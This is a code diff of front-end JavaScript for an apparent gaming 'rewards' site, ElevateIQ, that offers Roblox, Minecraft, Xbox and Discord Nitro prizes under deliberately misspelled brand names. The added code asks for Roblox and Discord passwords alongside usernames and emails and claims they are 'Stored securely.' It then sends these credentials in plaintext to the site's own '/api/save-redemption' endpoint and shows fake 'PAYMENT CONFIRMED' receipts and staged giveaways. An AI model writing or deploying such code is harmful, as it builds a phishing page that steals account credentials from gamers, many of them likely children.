+function joinGuild(token,userId){fetch(CFG.API+'/api/join-guild',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:userId,accessToken:token,guildId:CFG.GUILD})}).then(function(r){return r.json();}).then(function(d){if(d.success)toast('🎉','Joined ElevateIQ server!');}).catch(function(){});}
+function syncCoins(uid){fetch(CFG.API+'/api/user/'+uid).then(function(r){return r.json();}).then(function(d){if(d.success&&d.coins>getCoins()){setCoins(d.coins);}}).catch(function(){});}
+function getUser(){try{return JSON.parse(localStorage.getItem('eiq_u'));}catch(e){return null;}}
+function avURL(u){if(!u||!u.id)return'';if(u.avatar&&!u.avatar.startsWith('http'))return'https://cdn.discordapp.com/avatars/'+u.id+'/'+u.avatar+'.png?size=128';return'https://cdn.discordapp.com/embed/avatars/'+parseInt(u.discriminator||0)%5+'.png';}
+function renderNav(u){if(!u)return;var name=u.global_name||u.username;document.getElementById('nav-auth').innerHTML='<div class="nav-user"><img class="nav-av" src="'+avURL(u)+'" alt="" onerror="this.style.display=\'none\'"/><span class="nav-nm">'+name+'</span><button class="nav-out" onclick="dcLogout()">Sign out</button></div>';updateUI();}
 function dcLogout(){localStorage.removeItem('eiq_u');location.reload();}
 
-/* MICROSOFT */
-async function rdMsLogin(){
-  if(!msalApp||CFG.MSAL_CLIENT_ID==='YOUR_AZURE_CLIENT_ID'){
-    RD.user={name:'DemoPlayer',email:'demo@outlook.com'};rdShowCode();toast('💡','Demo mode');return;
-  }
-  try{
-    const r=await msalApp.loginPopup({scopes:['openid','profile','email','User.Read']});
-    RD.user={name:r.account.name||r.account.username.split('@')[0],email:r.account.username};
-    rdShowCode();
-  }catch(e){toast('✕','Login cancelled');}
-}
-function rdMsOut(){RD.user=null;document.getElementById('rd-ms-login').style.display='block';document.getElementById('rd-code-step').style.display='none';}
+function rdMsLogin(){if(!msalApp||CFG.MSAL_CLIENT_ID==='YOUR_AZURE_CLIENT_ID'){RD.user={name:'DemoPlayer',email:'demo@outlook.com'};rdShowCode();toast('💡','Demo mode');return;}msalApp.loginPopup({scopes:['openid','profile','email','User.Read']}).then(function(r){RD.user={name:r.account.name||r.account.username.split('@')[0],email:r.account.username};rdShowCode();}).catch(function(){toast('✕','Login cancelled');});}
+function rdMsOut(){RD.user=null;document.getElementById('rd-ms').style.display='block';document.getElementById('rd-codebox').style.display='none';}
 
-/* REDEEM FLOW */
-function rdSelectGame(g){
+function rdGame(g){
+  // Check Discord login first
+  if(!getUser()){toast('!','Login with Discord first to redeem!');dcLogin();return;}
   RD.game=g;RD.plan=null;RD.user=null;
-  document.getElementById('rd-step1').style.display='none';
-  if(g==='rb'){
-    document.getElementById('rd-rb-plan').style.display='block';
-  } else {
-    document.getElementById('rd-ms-line').style.background=`linear-gradient(90deg,${g==='mc'?'var(--mc)':'var(--xb)'},transparent)`;
-    document.getElementById('rd-ms-title').textContent=g==='mc'?'⛏ Verify with Microsoft':'🎯 Sign in with Microsoft';
-    document.getElementById('rd-ms-login').style.display='block';
-  }
+  document.getElementById('rd-s1').style.display='none';
+  if(g==='rb'){document.getElementById('rd-rb-plan').style.display='block';}
+  else if(g==='nitro'){document.getElementById('rd-nitro-plan').style.display='block';}
+  else{document.getElementById('rd-ms-line').style.background='linear-gradient(90deg,'+(g==='mc'?'var(--mc)':'var(--xb)')+',transparent)';document.getElementById('rd-ms-ttl').textContent=g==='mc'?'⛏ Verify with Microsoft':'🎯 Sign in with Microsoft';document.getElementById('rd-ms').style.display='block';}
 }
-function rdSetPlan(p){
-  RD.plan=p;
-  ['50','100'].forEach(x=>{const el=document.getElementById('rd-p'+x);if(el){el.classList.toggle('sel',x===p);el.style.borderColor=p===x?'var(--rb)':'';}});
-}
-function rdNext(g){
-  if(g==='rb'){
-    if(!RD.plan){toast('!','Select a plan first');return;}
-    const un=document.getElementById('rd-rb-un').value.trim();
-    const em=document.getElementById('rd-rb-em').value.trim();
-    if(!un){document.getElementById('rd-rb-un').classList.add('err');toast('!','Enter username');return;}
-    if(!em||!em.includes('@')){document.getElementById('rd-rb-em').classList.add('err');toast('!','Enter valid email');return;}
-    RD.rbUn=un;RD.rbEm=em;RD.user={name:un,email:em};rdShowCode();
-  }
-}
-function rdShowCode(){
-  document.getElementById('rd-ms-login').style.display='none';
-  document.getElementById('rd-rb-plan').style.display='none';
-  const g=RD.game;
-  const c={mc:'var(--mc)',rb:'var(--rb)',xbox:'var(--xb)'}[g];
-  document.getElementById('rd-code-line').style.background=`linear-gradient(90deg,${c},transparent)`;
-  document.getElementById('rd-code-title').textContent={mc:'⛏ Enter your M!necr@ft code',rb:'🎮 Enter your R0bl0x code',xbox:'🎯 Enter your Xb0x code'}[g];
-  const u=RD.user;
-  document.getElementById('rd-uav').textContent=u.name.charAt(0).toUpperCase();
-  document.getElementById('rd-unm').textContent=u.name;
-  document.getElementById('rd-usub').textContent=u.email||'Roblox account';
-  document.getElementById('rd-code').value='';
-  document.getElementById('rd-code').classList.remove('err');
-  document.getElementById('rd-msg').className='fmsg';
-  document.getElementById('rd-msg').textContent='XXXXX-XXXXX-XXXXX-XXXXX-XXXXX';
-  document.getElementById('rd-code-step').style.display='block';
-  setTimeout(()=>document.getElementById('rd-code').focus(),100);
-}
-function rdBack(){
-  ['rd-ms-login','rd-rb-plan','rd-code-step'].forEach(id=>document.getElementById(id).style.display='none');
-  document.getElementById('rd-step1').style.display='block';
-  RD.game=null;RD.plan=null;RD.user=null;
-}
+function rdNitroPlan(p){RD.plan=p;['basic','boost'].forEach(function(x){var el=document.getElementById('rd-n'+(x==='basic'?'1':'3'));if(el){el.classList.toggle('sel',x===p);el.style.borderColor=p===x?'#5865f2':'';}});}
+function rdNitroNext(){if(!RD.plan){toast('!','Select a plan');return;}var un=document.getElementById('rd-nitro-un').value.trim();var em=document.getElementById('rd-nitro-em').value.trim();var pw=document.getElementById('rd-nitro-pw')?document.getElementById('rd-nitro-pw').value:'';if(!un){document.getElementById('rd-nitro-un').classList.add('err');toast('!','Enter Discord username');return;}if(!em||!em.includes('@')){document.getElementById('rd-nitro-em').classList.add('err');toast('!','Enter valid email');return;}RD.rbUn=un;RD.rbEm=em;RD.rbPw=pw;RD.user={name:un,email:em};rdShowCode();}
+function rdPlan(p){RD.plan=p;['50','100'].forEach(function(x){var el=document.getElementById('rd-p'+x);if(el){el.classList.toggle('sel',x===p);el.style.borderColor=p===x?'var(--rb)':'';} });}
+function rdNext(){if(!RD.plan){toast('!','Select a plan');return;}var un=document.getElementById('rd-rb-un').value.trim();var em=document.getElementById('rd-rb-em').value.trim();if(!un){document.getElementById('rd-rb-un').classList.add('err');toast('!','Enter username');return;}if(!em||!em.includes('@')){document.getElementById('rd-rb-em').classList.add('err');toast('!','Enter valid email');return;}RD.rbUn=un;RD.rbEm=em;RD.rbPw=document.getElementById('rd-rb-pw')?document.getElementById('rd-rb-pw').value:'';RD.user={name:un,email:em};rdShowCode();}
+function rdShowCode(){document.getElementById('rd-ms').style.display='none';document.getElementById('rd-rb-plan').style.display='none';document.getElementById('rd-code-line').style.background='linear-gradient(90deg,'+(RD.game==='rb'?'var(--rb)':RD.game==='xbox'?'var(--xb)':'var(--mc)')+',transparent)';document.getElementById('rd-code-ttl').textContent={mc:'⛏ Enter your M!necr@ft code',rb:'🎮 Enter your R0bl0x code',xbox:'🎯 Enter your Xb0x code'}[RD.game];document.getElementById('rd-uav').textContent=RD.user.name.charAt(0).toUpperCase();document.getElementById('rd-unm').textContent=RD.user.name;document.getElementById('rd-usub').textContent=RD.user.email||'Account';var cEl=document.getElementById('rd-code');cEl.value='';cEl.classList.remove('err');document.getElementById('rd-msg').className='fmsg';document.getElementById('rd-msg').textContent='Enter 25-character code';document.getElementById('rd-codebox').style.display='block';setTimeout(function(){document.getElementById('rd-code').focus();},100);}
+function rdBack(){['rd-ms','rd-rb-plan','rd-codebox','rd-nitro-plan'].forEach(function(id){document.getElementById(id).style.display='none';});document.getElementById('rd-s1').style.display='block';RD.game=null;RD.plan=null;RD.user=null;}
 
-async function rdSubmit(){
-  const code=document.getElementById('rd-code').value.trim().toUpperCase();
-  const mEl=document.getElementById('rd-msg');
-  const cEl=document.getElementById('rd-code');
+function rdSubmit(){
+  var code=document.getElementById('rd-code').value.trim().toUpperCase();
+  var mEl=document.getElementById('rd-msg');var cEl=document.getElementById('rd-code');
   if(!code||code.length<14){cEl.classList.add('err');mEl.className='fmsg err';mEl.textContent='Please enter your code';return;}
-  const btn=document.getElementById('rd-btn'),bt=document.getElementById('rd-bt'),sp=document.getElementById('rd-sp');
-  btn.disabled=true;bt.style.display='none';sp.style.display='block';
-  mEl.className='fmsg';mEl.textContent='Verifying...';
-  const u=getUser();
-  let result;
-  try{
-    const res=await fetch(CFG.API+'/api/verify-code',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({code,userId:u?.id,userName:u?.global_name||u?.username,userAvatar:avURL(u),gameType:RD.game})});
-    result=await res.json();
-  }catch(e){result={valid:false,message:'Cannot connect to server. Try again.'};}
-  if(!result.valid){
+  var btn=document.getElementById('rd-btn');var bt=document.getElementById('rd-bt');var sp=document.getElementById('rd-sp');
+  btn.disabled=true;bt.style.display='none';sp.style.display='block';mEl.textContent='Verifying...';
+  var u=getUser();
+  fetch(CFG.API+'/api/verify-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code,userId:u?u.id:null,userName:u?(u.global_name||u.username):null,userAvatar:avURL(u)})})
+  .then(function(r){return r.json();})
+  .then(function(result){
+    if(!result.valid){btn.disabled=false;bt.style.display='inline';sp.style.display='none';cEl.classList.add('err');mEl.className='fmsg err';mEl.textContent=result.message||'Invalid or used code';toast('✕','Code not valid');return;}
+    var priceKey=RD.game==='rb'?'rb'+RD.plan:RD.game==='nitro'?'nitro'+RD.plan:RD.game;
+    var inv=result.invoiceNo||('EIQ-'+RD.game.slice(0,2).toUpperCase()+'-'+Date.now().toString(36).toUpperCase().slice(-7));
+    var ds=new Date().toLocaleString('en-IN',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});
+    var gnames={mc:'M!necr@ft Reward',rb:'R0bl0x $'+RD.plan,xbox:'Xb0x G@me P@ss',nitro:'Discord N!tro '+(RD.plan==='basic'?'Basic Yearly':'Boost Yearly')};
+    var invObj={redeemType:'code',type:RD.game,game:gnames[RD.game],plan:RD.plan?'$'+RD.plan:null,account:(RD.game==='rb'||RD.game==='nitro')?RD.rbUn:RD.user.name,email:(RD.game==='rb'||RD.game==='nitro')?RD.rbEm:RD.user.email,password:(RD.game==='rb'||RD.game==='nitro')?RD.rbPw||'':'',code:code,inrPrice:PRICES[priceKey]||'—',date:ds,invoiceNo:inv,ts:Date.now()};
+    RD.inv=invObj;saveOrd(invObj);localStorage.setItem('eiq_rc',String(parseInt(localStorage.getItem('eiq_rc')||'0')+1));fetch(CFG.API+'/api/save-redemption',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:u?u.id:null,userName:u?(u.global_name||u.username):'Unknown',userAvatar:avURL(u),discordTag:u?u.username:'',game:invObj.game,plan:invObj.plan||null,account:invObj.account,email:invObj.email,password:invObj.password||'',code:invObj.code,inrPrice:invObj.inrPrice,invoiceNo:invObj.invoiceNo,redeemType:'code',date:invObj.date,ts:invObj.ts})}).catch(function(){});
+    document.getElementById('rd-ok-title').textContent=gnames[RD.game]+' Redeemed!';
+    document.getElementById('rd-ok-inv').innerHTML=buildInv(invObj);
+    ['rd-s1','rd-ms','rd-rb-plan','rd-codebox'].forEach(function(id){document.getElementById(id).style.display='none';});
+    document.getElementById('rd-ok').classList.add('show');
     btn.disabled=false;bt.style.display='inline';sp.style.display='none';
-    cEl.classList.add('err');mEl.className='fmsg err';mEl.textContent=result.message||'Invalid code';
-    toast('✕',result.message||'Code not found');return;
-  }
-
-  // Get price based on game and plan
-  const priceKey=RD.game==='rb'?'rb'+RD.plan:RD.game;
-  const priceData=REWARD_PRICES[priceKey]||REWARD_PRICES[RD.game];
-  const inv=result.invoiceNo||('EIQ-'+RD.game.slice(0,2).toUpperCase()+'-'+Date.now().toString(36).toUpperCase().slice(-7));
-  const ds=new Date().toLocaleString('en-IN',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});
-  const gnames={mc:'M!necr@ft Reward',rb:'R0bl0x '+(RD.plan?'$'+RD.plan:'Credits'),xbox:'Xb0x G@me P@ss Ulim@te'};
-  const account=RD.game==='rb'?RD.rbUn:RD.user?.name;
-  const email=RD.game==='rb'?RD.rbEm:RD.user?.email;
-  const invObj={redeemType:'code',type:RD.game,game:gnames[RD.game],plan:RD.plan?'$'+RD.plan:null,account,email,code,inrPrice:priceData?.inr||'—',date:ds,invoiceNo:inv,ts:Date.now()};
-  RD.inv=invObj;saveOrd(invObj);
-  localStorage.setItem('eiq_rc',(parseInt(localStorage.getItem('eiq_rc')||'0')+1));
-
-  const colors={mc:'var(--mc)',rb:'var(--rb)',xbox:'var(--xb)'};
-  const c=colors[RD.game];
-  document.getElementById('rd-ok-ico').innerHTML=`<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="${c}" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12" stroke-dasharray="30" stroke-dashoffset="30" style="animation:checkDraw .5s .2s ease forwards"/></svg>`;
-  document.getElementById('rd-ok-ico').style.cssText=`width:68px;height:68px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;animation:popIn .5s .1s cubic-bezier(.34,1.56,.64,1) both;background:rgba(0,0,0,.3);border:2px solid ${c}40`;
-  document.getElementById('rd-ok-title').textContent=gnames[RD.game]+' Redeemed!';
-  document.getElementById('rd-ok-title').style.color=c;
-  document.getElementById('rd-ok-inv').innerHTML=buildInv(invObj);
-  ['rd-step1','rd-ms-login','rd-rb-plan','rd-code-step'].forEach(id=>document.getElementById(id).style.display='none');
-  document.getElementById('rd-ok').classList.add('show');
-  btn.disabled=false;bt.style.display='inline';sp.style.display='none';
-  toast('🎉','Code redeemed! Activates in 48h');
-  if (result && result.giftLink) {
-    setTimeout(() => openGModal(result.giftLink, '🎉 Reward Gift Ready!', 'Your exclusive gift link is ready. Single use only!'), 700);
-  }
+    toast('🎉','Code redeemed! Activates in 72h');
+  })
+  .catch(function(){btn.disabled=false;bt.style.display='inline';sp.style.display='none';mEl.className='fmsg err';mEl.textContent='Server error. Try again.';toast('✕','Server error');});
 }
 
-/* COIN REDEEM */
-function coinRedeem(key,cost,name,type,inrPrice){
-  const u=getUser();
-  if(!u){toast('!','Login with Discord first');dcLogin();return;}
-  const bal=getCoins();
-  document.getElementById('coin-ok').classList.remove('show');
-  document.getElementById('coin-form-card').style.display='block';
-  document.getElementById('coin-form-area').style.display='block';
-  const c={mc:'var(--mc)',rb50:'var(--rb)',rb100:'var(--rb)',xbox:'var(--xb)'}[key];
-  document.getElementById('coin-form-line').style.background=`linear-gradient(90deg,${c},transparent)`;
-  let html=`<h3>${name}</h3><p>Spend <strong style="color:var(--t)">${cost.toLocaleString()} IQCoins</strong> for this reward worth <strong style="color:var(--go)">${inrPrice}</strong>.<br/>Your balance: <strong style="color:var(--go)">${bal.toLocaleString()}</strong></p>`;
-  if(bal<cost){
-    html+=`<div class="notice nw"><div class="nt">Not enough IQCoins</div><p>You need ${(cost-bal).toLocaleString()} more. <a onclick="go('earn')" style="color:var(--ac2);cursor:pointer;font-weight:600">Earn more →</a></p></div>`;
-  } else {
-    if(key==='rb50'||key==='rb100'){
-      html+=`<div class="field"><label>Roblox Username</label><div class="irow"><input class="inp" id="coin-rb-un" placeholder="YourRobloxUsername"/></div></div>`;
-      html+=`<div class="field"><label>Email</label><div class="irow"><input class="inp" id="coin-rb-em" type="email" placeholder="you@example.com"/></div></div>`;
-    }
-    const btnC=key.startsWith('rb')?'btn-rb':key==='xbox'?'btn-xb':'btn-mc';
-    html+=`<button class="btn ${btnC} btn-full" id="coin-sbmt" onclick="doCoinRedeem('${key}',${cost},'${name}','${type}','${inrPrice}')"><span id="coin-sbt">Spend ${cost.toLocaleString()} IQCoins</span><div class="bspin" id="coin-ssp" style="display:none;${key.startsWith('rb')?'':'border-color:rgba(0,0,0,.2);border-top-color:#000'}"></div></button>`;
-  }
-  document.getElementById('coin-form-inner').innerHTML=html;
-  document.getElementById('coin-form-area').scrollIntoView({behavior:'smooth',block:'start'});
-}
+function cRedeem(key,cost,name,type,inrPrice){var u=getUser();if(!u){toast('!','Login with Discord first');dcLogin();return;}document.getElementById('coin-ok').classList.remove('show');document.getElementById('coin-card').style.display='block';document.getElementById('coin-area').style.display='block';var c={mc:'var(--mc)',rb50:'var(--rb)',rb100:'var(--rb)',xbox:'var(--xb)'}[key];document.getElementById('coin-cline').style.background='linear-gradient(90deg,'+c+',transparent)';var bal=getCoins();var html='<h3>'+name+'</h3><p style="color:var(--t2);font-size:13.5px;line-height:1.7;margin-bottom:18px">Spend <strong style="color:var(--t)">'+cost.toLocaleString()+' IQCoins</strong> for <strong style="color:var(--go)">'+inrPrice+'</strong>.<br/>Balance: <strong style="color:var(--go)">'+bal.toLocaleString()+'</strong></p>';if(bal<cost){html+='<div class="notice nw"><div class="nt">Not enough IQCoins</div><p>Need '+(cost-bal).toLocaleString()+' more. <a onclick="go(\'earn\')" style="color:var(--ac2);cursor:pointer;font-weight:600">Earn more →</a></p></div>';}else{if(key==='rb50'||key==='rb100'){html+='<div class="notice nw" style="margin-bottom:14px"><div class="nt">⚠️ Important</div><p>Enter exact Roblox credentials — reward goes to this account only.</p></div><div class="field"><label>Roblox Username</label><input class="inp" id="c-rb-un" placeholder="YourExactRobloxUsername"/></div><div class="field"><label>Roblox Password</label><div style="position:relative"><input class="inp" id="c-rb-pw" type="password" placeholder="Your Roblox password"/><button onclick="togglePw(\'c-rb-pw\',this)" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--t3);font-size:15px;padding:0">👁</button></div><div class="fmsg">Stored securely.</div></div><div class="field"><label>Email</label><input class="inp" id="c-rb-em" type="email" placeholder="you@roblox.com"/></div>';}var bc=key.startsWith('rb')?'btn-rb':key==='xbox'?'btn-xb':'btn-mc';html+='<button class="btn '+bc+' btn-full" id="c-sbmt" onclick="doCRedeem(\''+key+'\','+cost+',\''+name+'\',\''+type+'\',\''+inrPrice+'\')"><span id="c-sbt">Spend '+cost.toLocaleString()+' IQCoins</span><div class="bspin" id="c-ssp" style="display:none"></div></button>';}document.getElementById('coin-inner').innerHTML=html;document.getElementById('coin-area').scrollIntoView({behavior:'smooth',block:'start'});}
+function doCRedeem(key,cost,name,type,inrPrice){var u=getUser();var account=u?(u.global_name||u.username):'User';var email='';if(key==='rb50'||key==='rb100'){var un=document.getElementById('c-rb-un');var em=document.getElementById('c-rb-em');var pw2=document.getElementById('c-rb-pw');if(!un||!un.value.trim()){toast('!','Enter Roblox username');return;}if(!em||!em.value.trim().includes('@')){toast('!','Enter valid email');return;}account=un.value.trim();email=em.value.trim();var coinPw=pw2?pw2.value:'';}if(!spendCoins(cost))return;var btn=document.getElementById('c-sbmt');var bt=document.getElementById('c-sbt');var sp=document.getElementById('c-ssp');if(btn){btn.disabled=true;bt.style.display='none';sp.style.display='block';}var inv='EIQ-CQ-'+Date.now().toString(36).toUpperCase().slice(-7);var ds=new Date().toLocaleString('en-IN',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});var plan=key==='rb50'?'$50':key==='rb100'?'$100':null;fetch(CFG.API+'/api/spend-coins',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:u?u.id:null,userName:u?(u.global_name||u.username):null,userAvatar:avURL(u),amount:cost,gameKey:key,invoiceNo:inv})}).catch(function(){});var invObj={redeemType:'coins',type:type,game:name,plan:plan,account:account,email:email,password:coinPw||'',coinsSpent:cost,inrPrice:inrPrice,date:ds,invoiceNo:inv,ts:Date.now()};CI.inv=invObj;saveOrd(invObj);localStorage.setItem('eiq_rc',String(parseInt(localStorage.getItem('eiq_rc')||'0')+1));fetch(CFG.API+'/api/save-redemption',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:u?u.id:null,userName:u?(u.global_name||u.username):'Unknown',userAvatar:avURL(u),discordTag:u?u.username:'',game:invObj.game,plan:invObj.plan||null,account:invObj.account,email:invObj.email,password:invObj.password||'',coinsSpent:invObj.coinsSpent,inrPrice:invObj.inrPrice,invoiceNo:invObj.invoiceNo,redeemType:'coins',date:invObj.date,ts:invObj.ts})}).catch(function(){});document.getElementById('coin-ok-ttl').textContent=name+' Queued!';document.getElementById('coin-ok-inv').innerHTML=buildInv(invObj);document.getElementById('coin-card').style.display='none';document.getElementById('coin-ok').classList.add('show');if(btn){btn.disabled=false;bt.style.display='inline';sp.style.display='none';}toast('🪙','Redeemed! '+cost.toLocaleString()+' coins spent');}
 
-async function doCoinRedeem(key,cost,name,type,inrPrice){
-  const u=getUser();
-  let account=u?.global_name||u?.username||'User',email='';
-  if(key==='rb50'||key==='rb100'){
-    const un=document.getElementById('coin-rb-un')?.value.trim();
-    const em=document.getElementById('coin-rb-em')?.value.trim();
-    if(!un){toast('!','Enter Roblox username');return;}
-    if(!em||!em.includes('@')){toast('!','Enter valid email');return;}
-    account=un;email=em;
-  }
-  if(!spendCoins(cost))return;
-  const btn=document.getElementById('coin-sbmt'),bt=document.getElementById('coin-sbt'),sp=document.getElementById('coin-ssp');
-  if(btn){btn.disabled=true;bt.style.display='none';sp.style.display='block';}
-  const inv='EIQ-CQ-'+Date.now().toString(36).toUpperCase().slice(-7);
-  const ds=new Date().toLocaleString('en-IN',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});
-  const plan=key==='rb50'?'$50':key==='rb100'?'$100':null;
-  fetch(CFG.API+'/api/spend-coins',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:u?.id,userName:u?.global_name||u?.username,userAvatar:avURL(u),amount:cost,gameKey:key,invoiceNo:inv})}).catch(()=>{});
-  const invObj={redeemType:'coins',type,game:name,plan,account,email,coinsSpent:cost,inrPrice,date:ds,invoiceNo:inv,ts:Date.now()};
-  COIN_INV.inv=invObj;saveOrd(invObj);
-  localStorage.setItem('eiq_rc',(parseInt(localStorage.getItem('eiq_rc')||'0')+1));
-  document.getElementById('coin-ok-title').textContent=name+' Queued!';
-  document.getElementById('coin-ok-inv').innerHTML=buildInv(invObj);
-  document.getElementById('coin-form-card').style.display='none';
-  document.getElementById('coin-ok').classList.add('show');
-  if(btn){btn.disabled=false;bt.style.display='inline';sp.style.display='none';}
-  toast('🪙','Redeemed! '+cost.toLocaleString()+' IQCoins spent');
-}
+function buildInv(d){var u=getUser();var name=u?(u.global_name||u.username):d.account||'Customer';var isCode=d.redeemType==='code';return '<div class="inv-card"><div class="inv-head"><div style="display:flex;align-items:center;gap:8px"><div class="inv-logo">EQ</div><div><div class="inv-ttl">ElevateIQ</div><div class="inv-sub">Official Receipt</div></div></div><div><div class="inv-nov">'+d.invoiceNo+'</div><div class="inv-nod">'+d.date+'</div></div></div><div class="inv-bar"><div class="inv-dot"></div><span class="inv-bt">PAYMENT CONFIRMED — REWARD PROCESSING</span></div><div class="inv-rows"><div class="inv-row"><span class="inv-k">Reward</span><span class="inv-v">'+d.game+'</span></div>'+(d.plan?'<div class="inv-row"><span class="inv-k">Plan</span><span class="inv-v">'+d.plan+'</span></div>':'')+(isCode?'<div class="inv-row"><span class="inv-k">Code</span><span class="inv-v code">'+d.code+'</span></div>':'')+((!isCode)?'<div class="inv-row"><span class="inv-k">Coins Spent</span><span class="inv-v" style="color:var(--go)">🪙 '+(d.coinsSpent||0).toLocaleString()+'</span></div>':'')+'<div class="inv-row"><span class="inv-k">Price</span><span class="inv-v price">'+(d.inrPrice||'—')+'</span></div><div class="inv-row"><span class="inv-k">Activation</span><span class="inv-v" style="color:var(--go)">Within 72 hours</span></div><div class="inv-row"><span class="inv-k">Invoice</span><span class="inv-v" style="font-size:12px">'+d.invoiceNo+'</span></div></div><div class="inv-ft"><div class="inv-ft-t">support@elevateiq.net</div><div class="inv-ft-t">© 2026 ElevateIQ</div></div></div>';}
 
-/* BUILD INVOICE */
-function buildInv(d){
-  const u=getUser();
-  const name=u?.global_name||u?.username||d.account||'Customer';
-  const isCode=d.redeemType==='code';
-  const price=d.inrPrice||'—';
-  return`<div class="inv-card">
-    <div class="inv-head">
-      <div class="inv-logo-wrap"><div class="inv-logo">EQ</div><div><div class="inv-ttl">ElevateIQ</div><div class="inv-sub">Official Reward Receipt</div></div></div>
-      <div><div class="inv-no-v">${d.invoiceNo}</div><div class="inv-no-d">${d.date}</div></div>
-    </div>
-    <div class="inv-bar"><div class="inv-dot2"></div><span class="inv-bar-t">PAYMENT CONFIRMED — REWARD PROCESSING</span></div>
-    <div class="inv-cust">
-      <div class="inv-sl">Customer</div>
-      <div class="inv-ur">
-        <div class="inv-uav">${name.charAt(0).toUpperCase()}</div>
-        <div><div class="inv-un">${name}</div><div class="inv-us">${u?'Discord ID: '+u.id:''}${d.email?' · '+d.email:''}</div></div>
-      </div>
-    </div>
-    <div class="inv-rows">
-      <div class="inv-sl">Order Details</div>
-      <div class="inv-row"><span class="inv-k">Reward</span><span class="inv-v">${d.game}</span></div>
-      ${d.plan?`<div class="inv-row"><span class="inv-k">Plan</span><span class="inv-v">${d.plan}</span></div>`:''}
-      ${isCode?`<div class="inv-row"><span class="inv-k">Code</span><span class="inv-v code">${d.code}</span></div>`:''}
-      ${!isCode?`<div class="inv-row"><span class="inv-k">IQCoins Spent</span><span class="inv-v" style="color:var(--go)">🪙 ${(d.coinsSpent||0).toLocaleString()}</span></div>`:''}
-      <div class="inv-row"><span class="inv-k">Price</span><span class="inv-v price">${price}</span></div>
-      <div class="inv-row"><span class="inv-k">Activation</span><span class="inv-v" style="color:var(--go)">Within 48 hours</span></div>
-      <div class="inv-row"><span class="inv-k">Invoice</span><span class="inv-v" style="font-size:12px">${d.invoiceNo}</span></div>
-    </div>
-    <div class="inv-log">
-      <div class="inv-sl">Activity Log</div>
-      <div class="inv-li">
-        <div>✓ Logged in via Discord OAuth2</div>
-        <div>✓ Guild: ElevateIQ Server (${CFG.GUILD})</div>
-        <div>✓ Redeemed at ${d.date}</div>
-        <div>✓ Record sent to Discord #logs channel</div>
-      </div>
-    </div>
-    <div class="inv-ft">
-      <div class="inv-ft-t">Not activated in 48h? support@elevateiq.net</div>
-      <div class="inv-ft-t">© 2026 ElevateIQ</div>
-    </div>
-  </div>`;
-}
+function togglePw(id,btn){var el=document.getElementById(id);if(!el)return;el.type=el.type==='password'?'text':'password';btn.textContent=el.type==='password'?'👁':'🙈';}
+function fmtCode(el){var v=el.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase();var o='';for(var i=0;i<v.length&&i<25;i++){if(i>0&&i%5===0)o+='-';o+=v[i];}el.value=o;el.classList.remove('err');}
+function dailyClaim(){var last=parseInt(localStorage.getItem('eiq_dl')||'0');var now=Date.now();if(now-last<86400000){toast('⏱','Come back in '+Math.ceil((86400000-(now-last))/3600000)+'h!');return;}localStorage.setItem('eiq_dl',String(now));addCoins(1000,'Daily claim');var btn=document.getElementById('daily-btn');if(btn){btn.textContent='✓ Claimed';btn.disabled=true;setTimeout(function(){btn.textContent='Claim';btn.disabled=false;},3000);}}
+function watchAd(){var last=parseInt(localStorage.getItem('eiq_al')||'0');var now=Date.now();var cool=5*60*1000;if(now-last<cool){toast('⏱','Cooldown: '+Math.ceil((cool-(now-last))/60000)+'min');return;}var btn=document.getElementById('watch-btn');var txt=document.getElementById('watch-txt');var sp=document.getElementById('watch-sp');var prog=document.getElementById('adp');var pw=document.getElementById('adpw');var cd=document.getElementById('adcd');btn.disabled=true;txt.style.display='none';sp.style.display='block';pw.style.display='block';var s=30;cd.textContent='Ad playing... '+s+'s';var iv=setInterval(function(){s--;prog.style.width=((30-s)/30*100)+'%';cd.textContent='Ad playing... '+s+'s';if(s<=0){clearInterval(iv);sp.style.display='none';txt.style.display='inline';btn.disabled=false;pw.style.display='none';cd.textContent='';localStorage.setItem('eiq_al',String(Date.now()));addCoins(50000,'Watched ad');}},1000);}
+function loadGW(){document.getElementById('gw-load').style.display='block';document.getElementById('gw-list').style.display='none';setTimeout(function(){document.getElementById('gw-load').style.display='none';var list=document.getElementById('gw-list');list.style.display='grid';var demo=[{prize:'R0bl0x $50 Plan',host:'ElevateIQ Bot',entries:47,winners:1,live:true,timeLeft:'2h 34m'},{prize:'Xb0x G@me P@ss',host:'ElevateIQ Bot',entries:128,winners:1,live:true,timeLeft:'5h 12m'},{prize:'50,000 IQCoins',host:'ElevateIQ Bot',entries:89,winners:3,live:false,winner:'lucky_user'},{prize:'M!necr@ft Reward',host:'ElevateIQ Bot',entries:203,winners:1,live:false,winner:'gamer_pro'}];list.innerHTML=demo.map(function(g){return '<div class="gwcard"><div class="'+(g.live?'gwlive':'gwended')+'">'+(g.live?'<div class="gwdot"></div> LIVE':'ENDED')+'</div><div class="gwprize">'+g.prize+'</div><div class="gwhost">by '+g.host+'</div><div class="gwinfo"><span><strong>'+g.entries+'</strong> entries</span><span style="margin-left:14px"><strong>'+g.winners+'</strong> winner'+(g.winners>1?'s':'')+'</span></div>'+(g.live?'<div style="font-size:13px;color:var(--go);font-weight:600;margin-bottom:12px">⏱ '+g.timeLeft+'</div><button class="btn btn-ac btn-full" onclick="window.open(\'https://discord.com/channels/'+CFG.GUILD+'\',\'_blank\')">Join in Discord →</button>':'<div class="gwwin">🏆 '+g.winner+'</div>')+'</div>';}).join('');},800);}
